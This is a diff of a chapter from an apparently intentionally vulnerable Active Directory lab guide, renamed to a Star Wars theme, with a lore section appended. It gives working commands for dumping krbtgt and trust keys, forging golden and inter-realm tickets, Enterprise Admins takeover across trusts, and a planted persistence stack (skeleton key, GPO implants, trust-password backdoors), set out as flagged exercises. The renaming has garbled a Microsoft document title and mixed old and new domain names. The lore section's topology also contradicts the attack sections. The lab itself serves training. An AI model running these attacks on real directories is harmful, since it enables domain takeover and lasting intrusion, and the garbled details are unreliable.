-A user in corp.local can be added to a group in finance.local if there's a foreign-security-principal (FSP) entry. The FSP is a stub object in `CN=ForeignSecurityPrincipals,DC=finance,DC=local` with name = the corp user's SID. Add that FSP to a privileged group in finance:
+A user in empire.local can be added to a group in rebel.local if there's a foreign-security-principal (FSP) entry. The FSP is a stub object in `CN=ForeignSecurityPrincipals,DC=rebel,DC=local` with name = the corp user's SID. Add that FSP to a privileged group in finance:
 
 ```bash
 # As DA in corp, add peter.parker's SID as FSP into finance EA via cross-realm LDAP:
-ldapmodify -H ldaps://dc01.finance.local -D "corp\\Administrator" -w '...' <<EOF
-dn: CN=Enterprise Admins,CN=Users,DC=finance,DC=local
+ldapmodify -H ldaps://yavin4.rebel.local -D "corp\\Administrator" -w '...' <<EOF
+dn: CN=Enterprise Admins,CN=Users,DC=rebel,DC=local
 changetype: modify
 add: member
-member: CN=S-1-5-21-CORP-1105,CN=ForeignSecurityPrincipals,DC=finance,DC=local
+member: CN=S-1-5-21-EMPIRE-1105,CN=ForeignSecurityPrincipals,DC=rebel,DC=local
 EOF
 ```
 
-This works only if the corp DA has write access to the finance EA group, which it doesn't by default — but a *misconfigured* admin migration scenario sometimes leaves this open. In DVAD it's deliberately enabled for the lab.
+This works only if the corp DA has write access to the finance EA group, which it doesn't by default — but a *misconfigured* admin migration scenario sometimes leaves this open. In EMPIRE it's deliberately enabled for the lab.
 
 [Flag: DF-017]
 
@@ -1006,11 +1006,11 @@ This works only if the corp DA has write access to the finance EA group, which i
 
 ## 12.22 Trust account password backdoor (DF-022)
 
-The trust account (e.g., `FINANCE$` on the corp side) has a password that AD rotates automatically every 30 days. If you set its password manually and disable the rotation, defenders cannot rotate it out from under you without breaking the trust entirely.
+The trust account (e.g., `REBEL$` on the corp side) has a password that AD rotates automatically every 30 days. If you set its password manually and disable the rotation, defenders cannot rotate it out from under you without breaking the trust entirely.
 
 ```
-PS> Set-ADAccountPassword -Identity 'FINANCE$' -NewPassword (ConvertTo-SecureString 'AttackerPicked!' -AsPlainText -Force)
-PS> Set-ADAccountControl -Identity 'FINANCE$' -PasswordNeverExpires $true
+PS> Set-ADAccountPassword -Identity 'REBEL$' -NewPassword (ConvertTo-SecureString 'AttackerPicked!' -AsPlainText -Force)
+PS> Set-ADAccountControl -Identity 'REBEL$' -PasswordNeverExpires $true
 ```
 
 You now have a known trust key for as long as the trust exists. Combine with §12.14 to mint inter-realm TGTs at will.
@@ -1073,9 +1073,9 @@ A common misconception: "Domain Admin in one domain ≠ admin in another domain 
 - A DA in a child domain can DCShadow / forge SID history to claim Enterprise Admins membership.
 - Schema Admins can modify the schema, which replicates everywhere.
 
-**Forest is the actual security boundary.** Microsoft documents this explicitly in *Security Considerations for Active Directory Domains and Trusts*.
+**Forest is the actual security boundary.** Microsoft documents this explicitly in *Security Considerations for empire-Mifflin-Active-Directory Domains and Trusts*.
 
-External trusts (`corp ↔ finance`, distinct forests) have SID filtering by default, so they *are* a security boundary — **unless filtering is disabled** (which DVAD does, on purpose, for the lab).
+External trusts (`corp ↔ finance`, distinct forests) have SID filtering by default, so they *are* a security boundary — **unless filtering is disabled** (which EMPIRE does, on purpose, for the lab).
 
 ### What does this mean operationally
 
@@ -1085,18 +1085,18 @@ If a customer has "two domains in one forest, with admin separation between them
 
 ## 12.25 (Concept) Building a persistence stack
 
-A real engagement plants 5–10 backdoors at different rungs. Example stack for a 6-month tenure on corp.local:
+A real engagement plants 5–10 backdoors at different rungs. Example stack for a 6-month tenure on empire.local:
 
 | Rung | Backdoor | Why |
 |---|---|---|
-| Host (file01) | WMI subscription firing every 30 min | Beacon revival if other paths burn |
-| Host (dc01) | Scheduled task running `nltest /dsgetdc:` | Looks operationally normal |
+| Host (scarif) | WMI subscription firing every 30 min | Beacon revival if other paths burn |
+| Host (coruscant) | Scheduled task running `nltest /dsgetdc:` | Looks operationally normal |
 | Object | Shadow cred on `Administrator` | PKINIT recovery, survives ACL audit |
-| Object | RBCD on `dc01$` from a controlled computer | Lets you S4U2Self from a low-priv user |
+| Object | RBCD on `coruscant$` from a controlled computer | Lets you S4U2Self from a low-priv user |
 | Domain | Two stashed AdminPFXs from ESC1 (different templates) | Two cert lifetimes, two templates to audit |
 | Domain | AdminSDHolder ACE for an obscure user | Easy DA recovery |
 | Domain | krbtgt hash + skeleton key on PDC | Golden + skeleton fallback |
-| Forest | Trust key for finance + root.corp | Cross-forest fallback |
+| Forest | Trust key for finance + trade.corp | Cross-forest fallback |
 | Forest | Forged "Golden cert" from corp-ca | Cross-forest survival of trust changes |
 | Forest | Schema attribute backdoor | Truly permanent |
 
@@ -1114,15 +1114,15 @@ Before attacking a trust, enumerate it carefully.
 
 ```bash
 # From corp DA, list every trust:
-impacket-getArch -target dc01.corp.local
-ldapsearch -H ldap://10.10.0.10 -D 'CORP\Administrator' -w '...' \
-    -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
+impacket-getArch -target coruscant.empire.local
+ldapsearch -H ldap://10.10.0.10 -D 'EMPIRE\Administrator' -w '...' \
+    -b 'CN=System,DC=empire,DC=local' '(objectClass=trustedDomain)' \
     name trustType trustDirection trustAttributes flatName
 ```
 
 `trustAttributes` bitmask (relevant bits):
 - `0x1 NON_TRANSITIVE` — doesn't follow chain
-- `0x4 QUARANTINED_DOMAIN` — SID filter ON (good for defender; DVAD removes it)
+- `0x4 QUARANTINED_DOMAIN` — SID filter ON (good for defender; EMPIRE removes it)
 - `0x8 FOREST_TRANSITIVE` — forest trust
 - `0x20 CROSS_ORGANIZATION` — Selective Auth
 - `0x40 WITHIN_FOREST` — intra-forest (child or tree-root)
@@ -1141,33 +1141,33 @@ PS> Get-ADTrust -Filter *
 
 ---
 
-## 12.27 finance.local pivot (DF-007)
+## 12.27 rebel.local pivot (DF-007)
 
-The corp ↔ finance external/forest trust. Direction in DVAD: bidirectional. SID filtering: disabled. So everything in §12.14 and §12.20 works.
+The corp ↔ finance external/forest trust. Direction in EMPIRE: bidirectional. SID filtering: disabled. So everything in §12.14 and §12.20 works.
 
 End-to-end pivot:
 
 ```bash
 # 1. From corp DA, dump trust key:
-impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc | grep -i finance
+impacket-secretsdump empire.local/Administrator:'...'@10.10.0.10 -just-dc | grep -i finance
 
 # 2. Forge inter-realm TGT with EA-of-finance ExtraSid:
 impacket-ticketer -nthash <FINANCE_TRUST_NT> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
-    -extra-sid S-1-5-21-FINANCE-519 \
-    -spn 'krbtgt/FINANCE.LOCAL' \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
+    -extra-sid S-1-5-21-REBEL-519 \
+    -spn 'krbtgt/rebel.local' \
     Administrator
 
 # 3. Use to request a TGS in finance:
 export KRB5CCNAME=Administrator.ccache
 impacket-getST -k -no-pass \
-    -spn 'cifs/dc01.finance.local' \
+    -spn 'cifs/yavin4.rebel.local' \
     -dc-ip 10.20.0.10 \
-    corp.local/Administrator
+    empire.local/Administrator
 
 # 4. Lateral with the TGS:
-impacket-psexec -k -no-pass dc01.finance.local
+impacket-psexec -k -no-pass yavin4.rebel.local
 type C:\Flags\DF-007.txt
 ```
 
@@ -1175,57 +1175,57 @@ type C:\Flags\DF-007.txt
 
 ---
 
-## 12.28 root.corp pivot (DF-001 / DF-008)
+## 12.28 trade.corp pivot (DF-001 / DF-008)
 
 ```bash
 # 1. DCSync corp krbtgt:
-impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc-user 'krbtgt'
+impacket-secretsdump empire.local/Administrator:'...'@10.10.0.10 -just-dc-user 'krbtgt'
 
-# 2. Get root.corp's SID:
-impacket-lookupsid corp.local/Administrator:'...'@10.30.0.10 0 | grep -i 'Domain SID'
+# 2. Get trade.corp's SID:
+impacket-lookupsid empire.local/Administrator:'...'@10.30.0.10 0 | grep -i 'Domain SID'
 
 # 3. Forge Golden with ExtraSid = root EA:
 impacket-ticketer -nthash <corp_krbtgt_NT> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
-    -extra-sid S-1-5-21-ROOT-519 \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
+    -extra-sid S-1-5-21-TRADE-519 \
     Administrator
 
 # 4. Request TGS for root DC:
 export KRB5CCNAME=Administrator.ccache
 impacket-getST -k -no-pass \
-    -spn 'cifs/dc01.root.corp' \
+    -spn 'cifs/neimoidia.trade.corp' \
     -dc-ip 10.30.0.10 \
-    corp.local/Administrator
+    empire.local/Administrator
 
 # 5. Auth:
-impacket-psexec -k -no-pass dc01.root.corp
+impacket-psexec -k -no-pass neimoidia.trade.corp
 ```
 
-You are now EA on root.corp → admin on every domain in the forest (corp, eu, anything else).
+You are now EA on trade.corp → admin on every domain in the forest (corp, eu, anything else).
 
 [Flag: DF-001 / DF-008]
 
 ---
 
-## 12.29 eu.corp.local pivot (DF-002 / DF-010)
+## 12.29 eu.empire.local pivot (DF-002 / DF-010)
 
 After DF-001, simplest route: log in as root EA.
 
 Direct route without going via root:
 
 ```bash
-# 1. Forge in corp with ExtraSid = eu DA (RID 512 of eu.corp.local SID):
-impacket-lookupsid corp.local/Administrator:'...'@10.10.0.11 0  # get eu SID
+# 1. Forge in corp with ExtraSid = eu DA (RID 512 of eu.empire.local SID):
+impacket-lookupsid empire.local/Administrator:'...'@10.10.0.11 0  # get eu SID
 impacket-ticketer -nthash <corp_krbtgt> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
     -extra-sid S-1-5-21-EU-512 \
     Administrator
 
 export KRB5CCNAME=Administrator.ccache
-impacket-getST -k -no-pass -spn 'cifs/dc01.eu.corp.local' -dc-ip 10.10.0.11 corp.local/Administrator
-impacket-psexec -k -no-pass dc01.eu.corp.local
+impacket-getST -k -no-pass -spn 'cifs/deathstar.eu.empire.local' -dc-ip 10.10.0.11 empire.local/Administrator
+impacket-psexec -k -no-pass deathstar.eu.empire.local
 ```
 
 [Flag: DF-002 / DF-010]
@@ -1236,15 +1236,15 @@ impacket-psexec -k -no-pass dc01.eu.corp.local
 
 After working through PLAN.md and §§12.27–12.29, you hold:
 
-- DA on `corp.local`
-- EA on `root.corp` (via SID history)
-- DA on `eu.corp.local` (via SID history into eu)
-- DA on `finance.local` (via forest-trust ticket forge with SID filter bypass)
+- DA on `empire.local`
+- EA on `trade.corp` (via SID history)
+- DA on `eu.empire.local` (via SID history into eu)
+- DA on `rebel.local` (via forest-trust ticket forge with SID filter bypass)
 - A backup PFX for Administrator in each domain
 - Shadow cred on at least one DA in each domain
 - Trust keys stashed for each trust
 - AdminSDHolder ACE in corp
-- A WMI subscription on file01
+- A WMI subscription on scarif
 
 This is the "everything compromised" state PLAN.md describes. The remaining capstone (chapter 14) is about chaining and writing it up.
 
@@ -1262,7 +1262,7 @@ Add `Enrollee` rights for a low-priv user (`peter.parker`) on a sensitive cert t
 
 ### 12.31.3 Roastable backup of krbtgt
 
-Set `krbtgt`'s `userAccountControl` bit `DONT_REQ_PREAUTH` (4194304). Now AS-REP roasting returns its hash without authentication. Re-run any time. (DVAD's krbtgt is normal — but this is a famous backdoor pattern.)
+Set `krbtgt`'s `userAccountControl` bit `DONT_REQ_PREAUTH` (4194304). Now AS-REP roasting returns its hash without authentication. Re-run any time. (EMPIRE's krbtgt is normal — but this is a famous backdoor pattern.)
 
 ### 12.31.4 RID 519 group backdoor
 
@@ -1270,7 +1270,7 @@ Create a new group `Domain Users-Mgmt` with SID ending in -519 manually — wait
 
 ### 12.31.5 GPO link to high-priv OU
 
-Even without editing the Default Domain Controllers Policy, you can `New-GPO` and link it to `OU=Domain Controllers,DC=corp,DC=local`. Your new GPO contains the malicious task; gpupdate applies it.
+Even without editing the Default Domain Controllers Policy, you can `New-GPO` and link it to `OU=Domain Controllers,DC=empire,DC=local`. Your new GPO contains the malicious task; gpupdate applies it.
 
 ---
 
@@ -1317,16 +1317,16 @@ Chapter 13 expands each of these into Sigma rules and KQL.
 
 1. DCSync krbtgt (CRED-007).
 2. Forge Administrator TGT (PER-001).
-3. `impacket-psexec` to dc01 — verify SYSTEM.
+3. `impacket-psexec` to coruscant — verify SYSTEM.
 4. Reset krbtgt **once**. Re-try the ticket. Does it still work? (Yes — `key(n-1)` still valid.)
 5. Wait > 10 hours, reset krbtgt again. Re-try. (Now it fails.)
 6. From the failure event, identify the precise error you'd alert on as a defender.
 
 ### Exercise 12.B — Silver ticket without DC traffic
 
-1. Get the NT hash of `sql01$` via DCSync.
-2. Forge a Silver ticket for `MSSQLSvc/sql01.corp.local:1433`.
-3. Run `tcpdump -i any -w silver.pcap host dc01.corp.local` on your attacker host during the auth — confirm zero traffic to dc01.
+1. Get the NT hash of `kamino$` via DCSync.
+2. Forge a Silver ticket for `MSSQLSvc/kamino.empire.local:1433`.
+3. Run `tcpdump -i any -w silver.pcap host coruscant.empire.local` on your attacker host during the auth — confirm zero traffic to coruscant.
 4. Compare to the same auth done with `getTGT + getST` — note the TGS-REQ that appears.
 
 ### Exercise 12.C — Diamond ticket vs Golden detection
@@ -1352,10 +1352,10 @@ Chapter 13 expands each of these into Sigma rules and KQL.
 
 ### Exercise 12.F — Skeleton key
 
-1. Skeleton-key dc01 from a DA shell.
-2. Confirm `impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local` works.
-3. Try `corp.local/peter.parker:mimikatz@dc01.corp.local` — also works.
-4. Reboot dc01. Re-try — fails.
+1. Skeleton-key coruscant from a DA shell.
+2. Confirm `impacket-psexec empire.local/Administrator:mimikatz@coruscant.empire.local` works.
+3. Try `empire.local/peter.parker:mimikatz@coruscant.empire.local` — also works.
+4. Reboot coruscant. Re-try — fails.
 5. Re-skeleton — works again.
 
 ### Exercise 12.G — Certificate persistence
@@ -1375,27 +1375,27 @@ Chapter 13 expands each of these into Sigma rules and KQL.
 ### Exercise 12.I — GPO startup-script implant
 
 1. SharpGPOAbuse `AddComputerScript` against Default Domain Controllers Policy with `net group "Domain Admins" peter.parker /add /domain`.
-2. Run `gpupdate /force` on dc01 (you need shell on dc01 first).
+2. Run `gpupdate /force` on coruscant (you need shell on coruscant first).
 3. Confirm peter.parker ∈ Domain Admins.
 4. Find the SYSVOL file that holds the implant — identify the event you'd alert on.
 
-### Exercise 12.J — Trust ticket to finance.local
+### Exercise 12.J — Trust ticket to rebel.local
 
 1. Dump trust key with secretsdump.
 2. Forge inter-realm TGT with `extra-sid` = finance EA.
-3. Request TGS for `cifs/dc01.finance.local`.
-4. Read `\\dc01.finance.local\C$\Flags\DF-005.txt`.
+3. Request TGS for `cifs/yavin4.rebel.local`.
+4. Read `\\yavin4.rebel.local\C$\Flags\DF-005.txt`.
 
 ### Exercise 12.K — Child → Root via SID history
 
 1. DCSync corp krbtgt.
 2. Forge Golden with extra-sid = root EA.
-3. Request TGS for `cifs/dc01.root.corp`.
-4. Read flag on dc01.root.corp.
+3. Request TGS for `cifs/neimoidia.trade.corp`.
+4. Read flag on neimoidia.trade.corp.
 
 ### Exercise 12.L — Persistence stack inventory
 
-After completing 12.A–12.K, enumerate every persistence artefact you've planted in DVAD. Map each to a row in §12.25's stack table. Write the cleanup procedure for a defender.
+After completing 12.A–12.K, enumerate every persistence artefact you've planted in EMPIRE. Map each to a row in §12.25's stack table. Write the cleanup procedure for a defender.
 
 ---
 
@@ -1437,3 +1437,85 @@ After completing 12.A–12.K, enumerate every persistence artefact you've plante
 - **KB5020805 — PAC validation hardening** — patch that affects Silver/Golden detectability.
 
 Next: [13-defense-and-detection.md](13-defense-and-detection.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
